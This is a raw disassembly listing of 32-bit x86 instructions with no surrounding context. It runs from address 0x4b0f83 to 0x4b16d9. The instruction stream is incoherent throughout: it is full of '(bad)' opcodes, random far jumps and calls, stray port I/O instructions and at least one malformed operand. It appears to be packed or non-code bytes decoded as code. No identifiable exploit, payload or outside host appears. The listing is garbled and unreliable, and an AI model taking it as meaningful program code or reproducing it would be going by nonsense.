  4b0f83:	and    esi,DWORD PTR ds:0x170f1d1e
  4b0f89:	loopne 0x4b0fcd
  4b0f8b:	call   0xae85887b
  4b0f90:	clc    
  4b0f91:	sbb    eax,DWORD PTR [ecx-0x42bbc4e4]
  4b0f97:	lods   al,BYTE PTR ds:[esi]
  4b0f98:	je     0x4b0fbf
  4b0f9a:	inc    edi
  4b0f9b:	mov    BYTE PTR [edi],cl
  4b0f9d:	jle    0x4b0f8f
  4b0f9f:	mov    esi,0x55015b00
  4b0fa4:	imul   eax,DWORD PTR [esi+0x7f],0xeadb08dc
  4b0fab:	add    ch,BYTE PTR [ebx]
  4b0fad:	inc    ecx
  4b0fae:	test   eax,0x3115adb9
  4b0fb3:	dec    edx
  4b0fb4:	add    al,0xd9
  4b0fb6:	mov    BYTE PTR [eax*8-0x14e65b0d],0x78
  4b0fbe:	cmp    DWORD PTR [ebx],ecx
  4b0fc0:	pushf  
  4b0fc1:	sbb    eax,DWORD PTR [ebx-0x643c3cd2]
  4b0fc7:	(bad)  
  4b0fc8:	jle    0x4b1011
  4b0fca:	add    BYTE PTR [eax+0x7a],bl
  4b0fcd:	and    DWORD PTR [eax],esi
  4b0fcf:	push   edi
  4b0fd0:	pop    edx
  4b0fd1:	add    DWORD PTR [esi-0x2d],ecx
  4b0fd4:	(bad)  [ecx-0x75]
  4b0fd7:	into   
  4b0fd8:	outs   dx,DWORD PTR ds:[esi]
  4b0fd9:	and    DWORD PTR [esi],esi
  4b0fdb:	lods   al,BYTE PTR ds:[esi]
  4b0fdc:	(bad)  
  4b0fdd:	in     eax,0x39
  4b0fdf:	shr    BYTE PTR [esi+0x10],cl
  4b0fe2:	inc    edx
  4b0fe3:	imul   edx,ecx,0x2
  4b0fe6:	xchg   ebx,eax
  4b0fe7:	or     BYTE PTR [ecx],al
  4b0fe9:	jne    0x4b0f9b
  4b0feb:	lea    ebp,ds:0x872a30e6
  4b0ff1:	add    DWORD PTR [edx],0x21
  4b0ff4:	sub    DWORD PTR [ebx+edx*2+0x46352fa3],ecx
  4b0ffb:	nop
  4b0ffc:	dec    esp
  4b0ffd:	pop    esi
  4b0ffe:	lock in eax,dx
  4b1000:	mov    al,ds:0xbf2800ed
  4b1005:	ror    BYTE PTR es:[eax-0x2b187f93],0xea
  4b100d:	or     DWORD PTR [ebp+0x17],0x10
  4b1011:	or     dh,BYTE PTR [eax-0x12]
  4b1014:	pushf  
  4b1015:	dec    ecx
  4b1016:	xor    ecx,DWORD PTR [eax]
  4b1018:	and    DWORD PTR es:[ecx],eax
  4b101b:	mov    ebx,0xb4c0c024
  4b1020:	js     0x4b1011
  4b1022:	mov    WORD PTR [esi+0x6d],es
  4b1025:	adc    BYTE PTR [ebp+0x15583a39],ch
  4b102b:	mov    dh,0xa0
  4b102d:	jb     0x4b0fd5
  4b102f:	das    
  4b1030:	repnz pop ebx
  4b1032:	(bad)  
  4b1034:	ins    DWORD PTR es:[edi],dx
  4b1035:	fdivr  DWORD PTR [eax]
  4b1037:	add    al,0xd9
  4b1039:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b103a:	jmp    0x8696463f
  4b103f:	dec    ecx
  4b1040:	repnz aaa 
  4b1042:	daa    
  4b1043:	fwait
  4b1044:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b1045:	and    al,0x5
  4b1047:	push   ebx
  4b1048:	dec    edx
  4b1049:	adc    BYTE PTR [eax],cl
  4b104b:	push   es
  4b104c:	jb     0x4b108d
  4b104e:	dec    eax
  4b104f:	push   eax
  4b1050:	jp     0x4b1052
  4b1052:	xor    edx,DWORD PTR [eax*1-0x2fe21093]
  4b1059:	mov    edi,0x277388ec
  4b105e:	arpl   WORD PTR [ebx+0x1f],di
  4b1061:	test   al,0xe
  4b1063:	pop    ecx
  4b1064:	or     DWORD PTR [ecx+edi*2+0x12d24c2b],0x1c443e63
  4b106f:	adc    esp,DWORD PTR [esi-0x15a2c3e2]
  4b1075:	xor    BYTE PTR [esi+ebp*8-0x3c9416fc],ah
  4b107c:	cld    
  4b107d:	jne    0x4b108f
  4b107f:	ins    DWORD PTR es:[edi],dx
  4b1080:	jmp    0xfed4:0x528ef94
  4b1087:	(bad)  
  4b1088:	(bad)  
  4b1089:	cld    
  4b108a:	mov    edx,0x7af59035
  4b108f:	push   cs
  4b1090:	dec    ebx
  4b1091:	pushf  
  4b1092:	and    eax,0x6e427408
  4b1097:	mov    bh,BYTE PTR [ecx-0x1fe0f6e6]
  4b109d:	adc    eax,0xe8999465
  4b10a2:	push   esi
  4b10a3:	das    
  4b10a4:	push   0x6e3a90f5
  4b10a9:	mov    edx,0x60b4dc6d
  4b10ae:	add    BYTE PTR [ecx+0x57],cl
  4b10b1:	daa    
  4b10b2:	xor    eax,0xc343d65c
  4b10b7:	push   ecx
  4b10b8:	jns    0x4b1119
  4b10ba:	add    al,0xa0
  4b10bc:	sar    dh,1
  4b10be:	stc    
  4b10bf:	mov    al,0xa8
  4b10c1:	sbb    eax,DWORD PTR [ebp+0x1b3d4951]
  4b10c7:	add    ecx,DWORD PTR [ebx-0x68c586ce]
  4b10cd:	out    0xb0,al
  4b10cf:	cmp    eax,DWORD PTR [edx-0x71]
  4b10d2:	push   eax
  4b10d3:	mov    ds:0x10009a9f,eax
  4b10d8:	mov    ebp,0xf42e687d
  4b10dd:	in     al,dx
  4b10de:	jns    0x4b10e4
  4b10e0:	popf   
  4b10e1:	push   0x18
  4b10e3:	and    ebp,edi
  4b10e5:	or     DWORD PTR [edx+0x5a],edx
  4b10e8:	or     al,0x4
  4b10ea:	sub    edx,0x1802c19
  4b10f0:	lods   al,BYTE PTR ds:[esi]
  4b10f1:	lds    eax,FWORD PTR [ebp+0x3d4dab87]
  4b10f7:	and    al,0xc4
  4b10f9:	mov    edi,ebp
  4b10fb:	neg    DWORD PTR ds:0x1cb42213
  4b1101:	mov    ds:0x2110a708,eax
  4b1106:	xor    dl,BYTE PTR [ecx]
  4b1108:	arpl   ax,cx
  4b110a:	or     ecx,DWORD PTR [edx]
  4b110c:	push   ss
  4b110d:	dec    esp
  4b110e:	and    DWORD PTR [edx-0x9],eax
  4b1111:	into   
  4b1112:	sub    bl,bh
  4b1114:	push   0x40
  4b1116:	push   ds
  4b1117:	dec    eax
  4b1118:	inc    ebx
  4b1119:	pop    edx
  4b111a:	adc    BYTE PTR [ebx-0x5b],cl
  4b111d:	xor    BYTE PTR [edx],0x0
  4b1120:	fadd   DWORD PTR [ebx+0x22]
  4b1123:	pop    esi
  4b1124:	push   cs
  4b1125:	fwait
  4b1126:	pushf  
  4b1127:	add    bl,BYTE PTR [eax]
  4b1129:	addr16 dec ebp
  4b112b:	rcr    BYTE PTR [eax],0x76
  4b112e:	leave  
  4b112f:	hlt    
  4b1130:	push   es
  4b1131:	daa    
  4b1132:	sar    BYTE PTR [edi+0x2e],0x46
  4b1136:	or     al,BYTE PTR [eax]
  4b1138:	mov    eax,0x38e38e39
  4b113d:	push   eax
  4b113e:	fisttp DWORD PTR [edx]
  4b1140:	lock add BYTE PTR [edx+eax*1-0x5960fb9e],ah
  4b1148:	pop    edx
  4b1149:	add    dl,BYTE PTR [esi]
  4b114b:	ret    0xc2e8
  4b114e:	push   eax
  4b114f:	pop    ebp
  4b1150:	sbb    eax,DWORD PTR [esi]
  4b1152:	xchg   edi,eax
  4b1153:	dec    DWORD PTR ds:0xc14d3b0b
  4b1159:	xor    ebx,DWORD PTR [edx-0x17cf218c]
  4b115f:	inc    ebp
  4b1160:	mov    dh,0x45
  4b1162:	adc    eax,0x61b5b35
  4b1167:	into   
  4b1168:	push   ebp
  4b1169:	sahf   
  4b116a:	sub    eax,0x741dc38
  4b116f:	ror    bl,0x99
  4b1172:	push   0x1e
  4b1174:	std    
  4b1175:	into   
  4b1176:	rcl    ecx,0x10
  4b1179:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b117a:	ficom  WORD PTR [esi-0x3d7653c]
  4b1180:	add    ch,BYTE PTR [edi-0x29]
  4b1183:	retf   
  4b1184:	pop    ebp
  4b1185:	pop    eax
  4b1186:	push   esp
  4b1187:	ret    
  4b1188:	data16 or al,0x3b
  4b118b:	or     al,0xd3
  4b118d:	inc    esp
  4b118e:	ror    DWORD PTR ds:0xb581d6db,0x61
  4b1195:	sbb    DWORD PTR [esi+0x349d3269],eax
  4b119b:	and    al,0x69
  4b119d:	fadd   st,st(4)
  4b119f:	push   0x37
  4b11a1:	jp     0x4b11bb
  4b11a3:	outs   dx,DWORD PTR ds:[esi]
  4b11a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b11a5:	sub    BYTE PTR [ecx],dh
  4b11a7:	lods   eax,DWORD PTR ds:[esi]
  4b11a8:	mov    al,0xb
  4b11aa:	pushf  
  4b11ab:	gs jo  0x4b1221
  4b11ae:	dec    ebp
  4b11af:	xchg   BYTE PTR [edi],dl
  4b11b1:	pop    ebp
  4b11b2:	mov    dh,cl
  4b11b4:	lds    eax,FWORD PTR [ecx+edx*2]
  4b11b7:	add    al,0xda
  4b11b9:	in     al,0xd7
  4b11bb:	add    DWORD PTR [edi],0xffffffa4
  4b11be:	push   0x3db6d95e
  4b11c3:	or     al,0xa7
  4b11c5:	test   al,0x71
  4b11c7:	sbb    BYTE PTR [ebx-0x3f3da32f],ch
  4b11cd:	shr    BYTE PTR [ecx-0xfedf9a3],1
  4b11d3:	push   0xc0f863ed
  4b11d8:	inc    edi
  4b11d9:	or     DWORD PTR [esi-0xf],0x8c1a7d65
  4b11e0:	or     al,BYTE PTR [eax+edi*1]
  4b11e3:	dec    eax
  4b11e4:	and    eax,0xee97f102
  4b11e9:	pop    esp
  4b11ea:	sbb    BYTE PTR [edi+0x14],bl
  4b11ed:	imul   ebx,DWORD PTR [eax],0x4a
  4b11f0:	add    ah,BYTE PTR [esi]
  4b11f2:	imul   eax,DWORD PTR ds:0xce190423,0xb5ab6826
  4b11fc:	pusha  
  4b11fd:	add    al,0xd5
  4b11ff:	or     al,0x5f
  4b1201:	jbe    0x4b121d
  4b1203:	inc    eax
  4b1204:	mov    cl,0xa
  4b1206:	pop    eax
  4b1207:	mov    ebx,0x32a30b8e
  4b120c:	out    dx,eax
  4b120d:	mov    DWORD PTR [edx+edx*2],edi
  4b1210:	out    dx,eax
  4b1211:	sbb    eax,0x81516029
  4b1216:	lock scas eax,DWORD PTR es:[edi]
  4b1218:	and    eax,0x8061db13
  4b121d:	mov    ecx,0x3a57002b
  4b1222:	or     ebx,DWORD PTR [esi-0x36]
  4b1225:	mov    al,0x50
  4b1227:	(bad)  
  4b1228:	cld    
  4b1229:	je     0x4b11b8
  4b122b:	add    eax,0xf8c50803
  4b1230:	xchg   esi,eax
  4b1231:	jbe    0x4b120c
  4b1233:	mov    eax,0x190dc0c
  4b1238:	daa    
  4b1239:	jnp    0x4b1238
  4b123b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b123c:	push   esp
  4b123d:	popa   
  4b123e:	inc    edi
  4b123f:	push   eax
  4b1240:	mov    esi,0x62788d93
  4b1245:	and    ebp,esi
  4b1247:	clc    
  4b1248:	or     DWORD PTR [eax+ecx*2-0x5f],esi
  4b124c:	add    BYTE PTR [edi],cl
  4b124e:	sbb    eax,0x9f5d27d6
  4b1253:	or     al,0x31
  4b1255:	ror    DWORD PTR [eax+0x4dcba100],cl
  4b125b:	push   ds
  4b125c:	mov    ebx,0xf82b9ef8
  4b1261:	je     0x4b122e
  4b1263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b1264:	mov    WORD PTR [ecx],fs
  4b1266:	(bad)  
  4b1267:	loope  0x4b1265
  4b1269:	je     0x4b12a1
  4b126b:	inc    ecx
  4b126c:	fs sbb al,0x62
  4b126f:	lock add ebp,edx
  4b1272:	jnp    0x4b1283
  4b1274:	loopne 0x4b1226
  4b1276:	adc    BYTE PTR [edx+0x5f1e7294],0xc3
  4b127d:	mov    BYTE PTR [edi+0xd],bl
  4b1280:	or     bl,bl
  4b1282:	push   cs
  4b1283:	adc    edx,0x1f646c75
  4b1289:	cmp    eax,0x6e701ef4
  4b128e:	fistp  WORD PTR [ebx+0x47]
  4b1291:	addr16 or al,0x47
  4b1294:	fcomp  QWORD PTR [ebp+0x160df6e7]
  4b129a:	outs   dx,DWORD PTR ds:[esi]
  4b129b:	adc    BYTE PTR [edi],ah
  4b129d:	lock push es
  4b129f:	in     al,dx
  4b12a0:	sti    
  4b12a1:	stc    
  4b12a2:	jbe    0x4b1295
  4b12a4:	daa    
  4b12a5:	hlt    
  4b12a6:	pop    es
  4b12a7:	jb     0x4b1307
  4b12a9:	ja     0x4b12c3
  4b12ab:	xchg   edi,eax
  4b12ac:	lock xor al,0xb6
  4b12af:	ja     0x4b12ff
  4b12b1:	outs   dx,DWORD PTR ds:[esi]
  4b12b2:	pop    ds
  4b12b3:	test   BYTE PTR [edi],cl
  4b12b5:	imul   ebx,DWORD PTR [edx],0xffffffda
  4b12b8:	and    al,0x75
  4b12ba:	and    DWORD PTR [esi],eax
  4b12bc:	sub    BYTE PTR [edx],al
  4b12be:	sbb    BYTE PTR [edi+0x52],dl
  4b12c1:	cmp    bh,BYTE PTR [edx+edx*1]
  4b12c4:	movsx  edi,BYTE PTR [eax+0x3e0fada1]
  4b12cb:	add    dl,bl
  4b12cd:	mov    al,ds:0x8d08e9d1
  4b12d2:	add    DWORD PTR [eax+eiz*8-0x3fc37b74],ebx
  4b12d9:	pop    es
  4b12da:	add    eax,ecx
  4b12dc:	push   0xf67f8880
  4b12e1:	fiadd  WORD PTR [eax]
  4b12e3:	push   fs
  4b12e5:	pop    edi
  4b12e6:	lock xor eax,0xfc452be8
  4b12ec:	xchg   ebx,eax
  4b12ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b12ee:	ror    BYTE PTR [esi-0x10],cl
  4b12f1:	and    al,0xf4
  4b12f3:	in     al,dx
  4b12f4:	fsub   QWORD PTR [eax]
  4b12f6:	nop
  4b12f7:	xor    ecx,DWORD PTR [eax+0x53f089f4]
  4b12fd:	adc    BYTE PTR [ebx+0x57e05d09],0x56
  4b1304:	push   esi
  4b1305:	adc    edx,edx
  4b1307:	pop    esp
  4b1308:	dec    eax
  4b1309:	loopne 0x4b12f7
  4b130b:	in     al,0xe8
  4b130d:	and    ah,cl
  4b130f:	repz xor al,0xe0
  4b1312:	hlt    
  4b1313:	lock dec edi
  4b1315:	mov    BYTE PTR [ebx],0xec
  4b1318:	adc    ecx,DWORD PTR [ebx+0x57]
  4b131b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b131c:	add    esp,DWORD PTR [esi]
  4b131e:	pshufw mm1,QWORD PTR [edx+0x1074fc52],0x83
  4b1326:	aas    
  4b1327:	xor    al,0x85
  4b1329:	in     al,0x75
  4b132b:	loopne 0x4b1358
  4b132d:	jge    0x4b1313
  4b132f:	into   
  4b1330:	lds    eax,FWORD PTR [ecx]
  4b1332:	gs ins DWORD PTR es:[edi],dx
  4b1334:	xchg   ebp,eax
  4b1335:	fistp  QWORD PTR [ecx-0x62]
  4b1338:	push   edx
  4b1339:	std    
  4b133a:	cmp    dl,BYTE PTR [edi+0x56]
  4b133d:	aas    
  4b133e:	push   cs
  4b133f:	xchg   ecx,eax
  4b1340:	xlat   BYTE PTR ds:[ebx]
  4b1341:	sbb    al,0xb2
  4b1343:	inc    ebp
  4b1344:	xchg   edx,eax
  4b1345:	loope  0x4b12ec
  4b1347:	call   0xf121:0x48111a09
  4b134e:	scas   al,BYTE PTR es:[edi]
  4b134f:	or     al,0xd1
  4b1351:	jo     0x4b1329
  4b1353:	popf   
  4b1354:	sti    
  4b1355:	or     BYTE PTR [ecx-0x33],ch
  4b1358:	add    BYTE PTR [ebx+0x52],ch
  4b135b:	add    al,0x12
  4b135d:	push   ebx
  4b135e:	imul   ecx,DWORD PTR [eax+edi*1],0x56
  4b1362:	and    DWORD PTR [edx],eax
  4b1364:	mov    DWORD PTR [edi-0x8],eax
  4b1367:	push   edi
  4b1368:	xor    edx,edx
  4b136a:	jb     0x4b1325
  4b136c:	cld    
  4b136d:	push   ebp
  4b136e:	aam    0x52
  4b1370:	push   ebx
  4b1371:	push   eax
  4b1372:	push   esi
  4b1373:	push   edi
  4b1374:	push   esi
  4b1375:	mov    ecx,?
  4b1377:	jge    0x4b13ca
  4b1379:	jge    0x4b13a1
  4b137b:	adc    BYTE PTR [eax],ch
  4b137d:	lods   eax,DWORD PTR ds:[esi]
  4b137e:	and    DWORD PTR [edx],eax
  4b1380:	mov    DWORD PTR [edi+0x307131a0],edx
  4b1386:	add    BYTE PTR [edi],cl
  4b1388:	inc    esi
  4b1389:	inc    eax
  4b138a:	dec    edi
  4b138b:	push   edi
  4b138c:	and    ecx,edi
  4b138e:	inc    ebp
  4b138f:	and    BYTE PTR [ebx],ah
  4b1391:	or     al,0x7a
  4b1393:	or     BYTE PTR [eax+eiz*1-0x5d1d959],ch
  4b139a:	mov    al,0x3
  4b139c:	and    al,0x36
  4b139e:	xchg   ebx,ecx
  4b13a0:	sbb    DWORD PTR [ebx-0x54],0x4471b8b3
  4b13a7:	add    DWORD PTR [edx],edx
  4b13a9:	push   es
  4b13aa:	cwde   
  4b13ab:	inc    esi
  4b13ac:	mov    al,BYTE PTR [ebp-0x6c29d0f4]
  4b13b2:	ins    DWORD PTR es:[edi],dx
  4b13b3:	in     al,0xe5
  4b13b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b13b6:	mov    dl,0x70
  4b13b8:	and    al,0x50
  4b13ba:	sbb    al,0x85
  4b13bc:	jl     0x4b1410
  4b13be:	xor    BYTE PTR [edx+0x56],bh
  4b13c1:	mov    DWORD PTR ds:0x10881fb,edx
  4b13c7:	sub    al,0x3c
  4b13c9:	test   DWORD PTR [ebp-0x15],esi
  4b13cc:	loope  0x4b13e2
  4b13ce:	sub    edi,ebx
  4b13d0:	xchg   BYTE PTR [ebx],dh
  4b13d2:	call   0xc723100c
  4b13d7:	push   cs
  4b13d8:	cld    
  4b13d9:	sub    edi,0x16
  4b13dc:	push   edi
  4b13dd:	sub    esi,0x16
  4b13e0:	(bad)  
  4b13e1:	or     esp,DWORD PTR [eax-0x38]
  4b13e4:	sub    eax,DWORD PTR [ecx+0xc283202]
  4b13ea:	add    cl,ch
  4b13ec:	rol    BYTE PTR [esi+0x45e73d75],0x8c
  4b13f3:	or     al,0x7
  4b13f5:	push   cs
  4b13f6:	loop   0x4b1439
  4b13f8:	fcom   DWORD PTR [ebx+0x74]
  4b13fb:	cmp    DWORD PTR [ecx+0x5353509c],edi
  4b1401:	push   ebx
  4b1402:	xor    esp,DWORD PTR [ebp+0x43b0380f]
  4b1408:	sub    ecx,esp
  4b140a:	add    al,0x44
  4b140c:	xchg   ebx,eax
  4b140d:	fdivr  QWORD PTR [ebx*2+0x60be1c42]
  4b1414:	and    eax,0x1faa772e
  4b1419:	rcr    BYTE PTR ds:0x416b8536,0x39
  4b1420:	lea    edx,[ebp+0x42ddbdaf]
  4b1426:	inc    esp
  4b1427:	mov    cl,0x80
  4b1429:	or     DWORD PTR [edx+0x24],esi
  4b142c:	inc    edi
  4b142d:	dec    ecx
  4b142e:	and    dl,cl
  4b1430:	fwait
  4b1431:	(bad)  
  4b1432:	aaa    
  4b1433:	test   DWORD PTR [esi],eax
  4b1435:	jl     0x4b1448
  4b1437:	xor    ebx,DWORD PTR [edi+0x6ae43f56]
  4b143d:	and    bl,bh
  4b143f:	or     dh,BYTE PTR [edx+0x31]
  4b1442:	mov    edx,0x4f6624ff
  4b1447:	push   edi
  4b1448:	adc    BYTE PTR [ebp+0x3d1df51f],bh
  4b144e:	lods   eax,DWORD PTR ds:[esi]
  4b144f:	in     al,dx
  4b1450:	jmp    0xdca568a
  4b1455:	stc    
  4b1456:	and    eax,DWORD PTR [ecx+0x1c]
  4b1459:	mov    ecx,0x8ddcd22f
  4b145e:	(bad)  
  4b145f:	loope  0x4b140b
  4b1461:	clc    
  4b1462:	sub    DWORD PTR [eax-0x7c],esp
  4b1465:	daa    
  4b1466:	and    BYTE PTR [ecx+ebx*1-0x52c158c1],bl
  4b146d:	jg     0x4b1427
  4b146f:	(bad)  
  4b1470:	jno    0x4b148e
  4b1472:	(bad)  
  4b1473:	and    edi,DWORD PTR [eax+eiz*1]
  4b1476:	ret    0x7de0
  4b1479:	pop    ebp
  4b147a:	adc    BYTE PTR [ebx+0x5c],ch
  4b147d:	cmp    BYTE PTR [edx+0x54],bl
  4b1480:	push   ebx
  4b1481:	out    0x7b,eax
  4b1483:	push   ebx
  4b1484:	xchg   DWORD PTR [edi+0x7420c665],ebx
  4b148a:	push   0x4d
  4b148c:	and    eax,0x61b1b79f
  4b1491:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b1492:	add    al,bl
  4b1494:	push   ecx
  4b1495:	ins    DWORD PTR es:[edi],dx
  4b1496:	call   0x8bd0749e
  4b149b:	cli    
  4b149c:	inc    edx
  4b149d:	outs   dx,BYTE PTR ds:[esi]
  4b149e:	(bad)  
  4b149f:	lods   al,BYTE PTR ds:[esi]
  4b14a0:	mov    bh,0x80
  4b14a2:	add    eax,0x389617eb
  4b14a7:	js     0x4b1520
  4b14a9:	mov    ebx,0x55528e06
  4b14ae:	push   ebx
  4b14af:	mov    eax,0xa6cef014
  4b14b4:	rcl    dl,1
  4b14b6:	pop    es
  4b14b7:	fcom   QWORD PTR [ecx+0x15]
  4b14ba:	bound  edx,QWORD PTR [ebp+0x56961202]
  4b14c0:	rol    DWORD PTR [ebx+ecx*1],1
  4b14c3:	(bad)
  4b14c6:	test   eax,0xfe50be8
  4b14cb:	leave  
  4b14cc:	retf   0x2051
  4b14cf:	add    DWORD PTR [edx],0x419e584
  4b14d5:	push   ss
  4b14d6:	pop    ebx
  4b14d7:	sub    esi,DWORD PTR [eax-0x6324ec40]
  4b14dd:	das    
  4b14de:	cmp    BYTE PTR [ebp-0x7f548768],dl
  4b14e4:	inc    edi
  4b14e5:	sub    DWORD PTR gs:[ebp-0x5b],edx
  4b14e9:	inc    ebx
  4b14ea:	and    eax,0x38f9da3d
  4b14ef:	push   esi
  4b14f0:	aaa    
  4b14f1:	add    eax,DWORD PTR [edx+ebp*4]
  4b14f4:	fs jne 0x4b1497
  4b14f7:	or     edx,DWORD PTR [eax+0x7651c80b]
  4b14fd:	test   edx,edi
  4b14ff:	adc    eax,0x560208f9
  4b1504:	mov    esp,0x117243be
  4b1509:	pop    es
  4b150a:	or     ecx,ebp
  4b150c:	adc    cl,BYTE PTR [ebp-0x49384a12]
  4b1512:	(bad)  
  4b1513:	jle    0x4b156d
  4b1515:	jmp    0xd4c9:0x7090500c
  4b151c:	and    esi,ecx
  4b151e:	repnz add esp,DWORD PTR [ebx]
  4b1521:	cmp    BYTE PTR [edx+eiz*1+0x36],dh
  4b1525:	or     BYTE PTR [ebx],0x57
  4b1528:	adc    dh,BYTE PTR [eax-0x3c]
  4b152b:	pop    es
  4b152c:	dec    eax
  4b152d:	xchg   ecx,eax
  4b152e:	out    dx,al
  4b152f:	sub    eax,0xd17cfee3
  4b1534:	pop    ds
  4b1535:	adc    BYTE PTR [edx+0x5f0b2034],cl
  4b153b:	ret    0x6c49
  4b153e:	adc    bh,dh
  4b1540:	aaa    
  4b1541:	or     bl,dl
  4b1543:	xchg   esp,eax
  4b1544:	ss sub bl,bl
  4b1547:	add    esi,DWORD PTR [esi-0x515acd7c]
  4b154d:	xchg   edi,eax
  4b154e:	adc    BYTE PTR [edx+eiz*1+0x19226510],0x12
  4b1556:	sub    ebp,ebx
  4b1558:	xchg   ecx,eax
  4b1559:	ror    BYTE PTR [ecx-0x78],0x94
  4b155d:	add    ebx,ebx
  4b155f:	retf   0x8646
  4b1562:	cmc    
  4b1563:	rcr    BYTE PTR [ecx],cl
  4b1565:	push   ecx
  4b1566:	idiv   DWORD PTR [esi]
  4b1568:	pop    ebx
  4b1569:	aad    0x78
  4b156b:	sbb    eax,0x720406ec
  4b1570:	or     eax,0x24a94044
  4b1575:	pop    es
  4b1576:	mov    al,0x80
  4b1578:	xor    esi,ebp
  4b157a:	jge    0x4b1556
  4b157c:	cs sbb al,0x40
  4b157f:	cmp    cl,BYTE PTR [eax+0x51]
  4b1582:	jne    0x4b15d0
  4b1584:	add    al,0xe0
  4b1586:	add    dl,0x7d
  4b1589:	or     dl,BYTE PTR [edx+0x5]
  4b158c:	js     0x4b15ee
  4b158e:	call   0x2a8aecf
  4b1593:	test   DWORD PTR [ebx-0x79abeb79],0x1f3b0b6b
  4b159d:	inc    ebp
  4b159e:	mov    esi,0x2071589b
  4b15a3:	and    BYTE PTR [eax-0x2250adaf],cl
  4b15a9:	rcl    DWORD PTR [esi+0x1124349],0x3c
  4b15b0:	mov    DWORD PTR [ebx+ecx*4+0x76],esp
  4b15b4:	inc    ebx
  4b15b5:	ror    al,0x97
  4b15b8:	or     al,0x52
  4b15ba:	ins    DWORD PTR es:[edi],dx
  4b15bb:	popf   
  4b15bc:	xor    al,0xb9
  4b15be:	sbb    bl,BYTE PTR [edi+0x24]
  4b15c1:	sbb    al,0xb4
  4b15c3:	or     al,0xc
  4b15c5:	sub    eax,0x810dd749
  4b15ca:	add    al,0xec
  4b15cc:	cmc    
  4b15cd:	lds    ebp,FWORD PTR [ebp*1-0x4034bcfa]
  4b15d4:	pop    edx
  4b15d5:	mov    edx,0x37713280
  4b15da:	dec    esp
  4b15db:	xor    esp,DWORD PTR [eax]
  4b15dd:	inc    ecx
  4b15de:	mov    es,WORD PTR [esi+0x1cc7a51d]
  4b15e4:	inc    ebx
  4b15e5:	push   0x10
  4b15e7:	sbb    ecx,DWORD PTR [esi]
  4b15e9:	mov    edi,0x85da3420
  4b15ee:	adc    DWORD PTR [esi+0x2c],0x916bd049
  4b15f5:	fwait
  4b15f6:	jno    0x4b15fd
  4b15f8:	imul   esi,DWORD PTR [edx+0x66],0x4db546e1
  4b15ff:	daa    
  4b1600:	jp     0x4b1626
  4b1602:	imul   ecx,DWORD PTR ds:0xc02c588f,0xef083b32
  4b160c:	push   ecx
  4b160d:	stos   BYTE PTR es:[edi],al
  4b160e:	fwait
  4b160f:	bound  eax,QWORD PTR [ecx+0x18]
  4b1612:	adc    DWORD PTR [eax-0x6b],0x51
  4b1616:	mov    bh,0x95
  4b1618:	ret    0xd10
  4b161b:	pop    ecx
  4b161c:	add    al,0x8c
  4b161e:	jbe    0x4b167a
  4b1620:	dec    edi
  4b1621:	fimul  WORD PTR [eax-0x227bfbf0]
  4b1627:	mov    eax,ds:0xcb55a26
  4b162c:	mov    edi,DWORD PTR [esi+0x7f]
  4b162f:	das    
  4b1630:	add    eax,0x158875a5
  4b1635:	mov    bl,0x1d
  4b1637:	call   DWORD PTR [esi]
  4b1639:	xchg   ebp,eax
  4b163a:	add    ch,BYTE PTR [esi+0x13f82e24]
  4b1640:	inc    ebp
  4b1641:	sub    dh,cl
  4b1643:	(bad)  
  4b1644:	add    BYTE PTR [edx+0x7e],cl
  4b1647:	leave  
  4b1648:	xor    DWORD PTR [ecx+0x496a5e2a],edi
  4b164e:	mov    bl,0x10
  4b1650:	pop    edx
  4b1651:	adc    al,0x5f
  4b1653:	inc    ecx
  4b1654:	outs   dx,DWORD PTR ds:[esi]
  4b1655:	dec    ebx
  4b1656:	jne    0x4b160f
  4b1658:	jne    0x4b1654
  4b165a:	sub    al,0x58
  4b165c:	pop    edx
  4b165d:	pop    ss
  4b165e:	pop    ds
  4b165f:	add    ecx,DWORD PTR [ecx]
  4b1661:	mov    BYTE PTR [edi+0x7d],cl
  4b1664:	out    dx,al
  4b1665:	jb     0x4b168c
  4b1667:	call   0x5a2a:0x3ac75540
  4b166e:	xchg   ebp,eax
  4b166f:	push   cs
  4b1670:	js     0x4b16b3
  4b1672:	lods   al,BYTE PTR ds:[esi]
  4b1673:	outs   dx,DWORD PTR ds:[esi]
  4b1674:	dec    eax
  4b1675:	outs   dx,DWORD PTR ds:[esi]
  4b1676:	sub    eax,0xb3ad06eb
  4b167b:	mov    al,0x4a
  4b167d:	jo     0x4b1697
  4b167f:	or     ch,BYTE PTR [eax+0x3007893d]
  4b1685:	mov    ch,0x4a
  4b1687:	or     ch,BYTE PTR [ebx+ecx*4-0x76]
  4b168b:	js     0x4b1633
  4b168d:	mov    al,bh
  4b168f:	(bad)
  4b1693:	mov    WORD PTR [ebx],ax
  4b1696:	jne    0x4b168c
  4b1698:	xchg   esi,eax
  4b1699:	sbb    eax,0xf51b62d2
  4b169e:	add    al,0x56
  4b16a0:	arpl   dx,dx
  4b16a2:	push   es
  4b16a3:	dec    ecx
  4b16a4:	stos   DWORD PTR es:[edi],eax
  4b16a5:	aaa    
  4b16a6:	scas   al,BYTE PTR es:[edi]
  4b16a7:	or     eax,0xc1cfe1a2
  4b16ac:	stc    
  4b16ad:	cwde   
  4b16ae:	xlat   BYTE PTR ds:[ebx]
  4b16af:	mov    ch,0x26
  4b16b1:	add    BYTE PTR [esi+eax*4+0x22],0x1f
  4b16b6:	retf   0xfd90
  4b16b9:	int3   
  4b16ba:	mov    al,0x20
  4b16bc:	push   ss
  4b16bd:	push   ebx
  4b16be:	or     ecx,edi
  4b16c0:	jp     0x4b16d6
  4b16c2:	cmp    al,0x20
  4b16c4:	or     al,0xcb
  4b16c6:	fstp   DWORD PTR [ebp+0x302666b2]
  4b16cc:	sbb    al,0xfd
  4b16ce:	repz (bad) 
  4b16d0:	ja     0x4b1682
  4b16d2:	rol    BYTE PTR [ecx],cl
  4b16d4:	mov    dh,0xbe
  4b16d6:	popa   
  4b16d7:	jae    0x4b170d
  4b16d9:	jb     0x4b16e3
